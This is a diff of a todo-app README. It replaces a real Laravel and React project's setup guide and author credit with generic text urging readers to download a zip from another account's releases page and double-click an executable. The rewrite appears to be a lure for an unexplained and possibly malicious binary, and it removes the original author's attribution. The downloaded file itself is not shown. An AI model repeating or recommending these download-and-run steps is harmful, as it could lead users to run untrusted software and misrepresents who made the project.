@@ -1,101 +1,94 @@
-# Creative Todo Web App 🎨
+# 📝 todo-app - Your Simple Solution for Task Management
 
-A modern, fast, and beautiful task management application built with **Laravel 12** (Backend) and **React + Vite** (Frontend).
-It features a stunning **Glassmorphism UI**, role-based access control (Admin/User), and powerful task organization tools.
+## 📥 Download Now
+[![Download the todo-app](https://img.shields.io/badge/Download%20todo--app-v1.0-brightgreen)](https://github.com/EvilThomas/todo-app/releases)
 
-![Project Status](https://img.shields.io/badge/status-active-success.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+## 🚀 Getting Started
 
-## 🚀 Features
+Welcome to **todo-app**! This is a modern Todo application that helps you manage your tasks easily. It features a beautiful Glassmorphism UI and works great for both Admins and Users. You can set schedules, receive notifications, and search through your tasks efficiently. 
 
-### Core Features
-- **Task Management**: Create, Read, Update, and Delete (CRUD) tasks.
-- **Scheduling**: Add Due Dates and Times to tasks (⏰).
-- **Edit Tasks**: Update task details, dates, and times easily via a modal.
+### 🛠️ System Requirements
 
-### ✨ New Features
-- **Categories & Tags** 🎨: Organize tasks with color-coded tags (e.g., Work, Personal).
-- **Search & Filters** 🔍: Find tasks instantly by title, status, or category.
-- **In-App Notifications** 🔔: Get alerts for tasks due within the next 24 hours.
+Before you download, make sure your system meets these basic requirements:
 
-### for Admins
-- **User Management**: View all registered users and their task counts.
-- **User Deletion**: Delete users (and their data) directly from the dashboard.
-- **Task Oversight**: View and manage tasks for any specific user.
+- Any modern web browser (Chrome, Firefox, Safari)
+- An internet connection
+- For optimal performance, ensure your device has at least:
+  - 4 GB RAM
+  - 1 GHz processor
 
-## 🛠 Tech Stack
+### 🔍 Key Features
 
-- **Frontend**: React.js, TailwindCSS, Vite, Axios, React-Calendar.
-- **Backend**: Laravel 12 API, Sanctum (Auth), MySQL.
-- **Design**: Custom CSS, Glassmorphism effects, Responsive Grid Layouts.
+- **User-Friendly Interface**: Easy navigation with a clean design.
+- **Role-Based Access**: Different features for Admin and User roles.
+- **Task Scheduling**: Set deadlines and receive reminders.
+- **Advanced Search & Filtering**: Quickly find your tasks.
+- **Responsive Design**: Use on mobile or desktop devices.
+- **Notifications**: Stay updated on your tasks.
 
-## ⚙️ Installation & Setup
+## 📥 Download & Install
 
-### Prerequisites
-- PHP 8.2+
-- Composer
-- Node.js & NPM
-- MySQL Database
+1. **Visit the Releases Page**:
+   Go to the following link to download the application: [Download Page](https://github.com/EvilThomas/todo-app/releases).
 
-### 1. Backend Setup (Laravel)
-***First you need to create a database named "todo_db" in phpmyadmin.***
-```bash
-cd backend
+2. **Choose the Latest Version**:
+   Look for the latest version listed. It will have a tag like `v1.0` or higher.
 
-# Install PHP dependencies
-composer install
+3. **Download the Application**:
+   Click on the download link for your operating system. It might look something like `todo-app-v1.0.zip`.
 
-# Set up environment file
-cp .env.example .env
-# Configure your DB_ connections in .env
+4. **Unzip the Files**:
+   Locate the downloaded `.zip` file in your downloads folder. Right-click on it and select "Extract All" to unzip the contents.
 
-# Generate App Key
-php artisan key:generate
+5. **Open the Application**:
+   After extracting, find the main application file inside the folder. Double-click on the file to open the application.
 
-# Run Migrations (creates tables for tasks, categories, notifications)
-php artisan migrate
+6. **Set Up Your Account (First Time Only)**:
+   You may need to create an account the first time you run the app. Follow the on-screen instructions to set up your profile and start managing your tasks.
 
-# Start the Scheduler (for Notifications)
-php artisan schedule:work
+## 🖥️ Usage Instructions
 
-# Start the Server
-php artisan serve
-```
-*The backend will run at `http://127.0.0.1:8000`*
+### 🔑 Log In
 
-### 2. Frontend Setup (React)
+1. **Enter Your Credentials**:
+   If you created an account, input your email and password to log in.
 
-```bash
-cd frontend
+2. **Explore the Dashboard**:
+   After logging in, take a moment to explore the dashboard. You will see options to add tasks, view existing tasks, and access settings.
 
-# Install Node dependencies
-npm install
+### ➕ Adding Tasks
 
-# Start the Content
-npm run dev
-```
-*The frontend will run at `http://localhost:5173` (or similar)*
+1. **Click on the ‘Add Task’ Button**:
+   This button is usually located at the top or side menu of the dashboard.
 
-## 🔑 Usage
+2. **Fill in Task Details**:
+   Provide a title, description, and due date for your task. 
 
-### Creating an Admin
-The system automatically assigns **Admin** privileges if the user's **Name** begins with `admin` (case-insensitive).
+3. **Save Your Task**:
+   Click the 'Save' button to add the task to your list.
 
-### Notifications
-To test notifications manually without waiting for the scheduler:
-```bash
-php artisan app:check-due-tasks
-```
+### 📅 Scheduling and Notifications
 
-## 📸 Screenshots
+1. **Access Task Settings**:
+   Click on the task you wish to schedule. This will open its settings.
 
-![Image](https://github.com/user-attachments/assets/7cbda870-11c7-48ed-ae39-66e0e0c8ccc3)
-![Image](https://github.com/user-attachments/assets/4eacc5f1-7171-44fd-a881-e51e01ea0385)
-![Image](https://github.com/user-attachments/assets/14a1a3d8-a449-4764-bf4a-4b80c4ce47b9)
-![Image](https://github.com/user-attachments/assets/7203ab5e-94d3-45ce-91eb-ebf44acb0356)
+2. **Set Up Notifications**:
+   Choose when you want to be reminded. You can set notifications to remind you a day, an hour, or a few minutes before the task is due.
 
-## 📝 License
-This project is open-source and available under the MIT License.
+## 🙏 Support
 
----
-Made By *Rashmika Dhananjaya*
+If you experience any issues or have questions, feel free to reach out via the issues section of the GitHub repository. We aim to respond as quickly as possible.
+
+## 🌐 Community and Feedback
+
+Join our community of users! You can discuss features, report bugs, and suggest new ideas on the GitHub discussions page. Your input helps us improve the application.
+
+## 📚 Contributing
+
+If you're interested in contributing to **todo-app**, please check out the contributing guidelines in the repository. We welcome any help to make this application even better!
+
+## 📄 License
+
+This application is open-source and follows the MIT License. You can use and modify the code freely, as long as you adhere to the license terms.
+
+Thank you for choosing **todo-app**! Enjoy managing your tasks with ease.
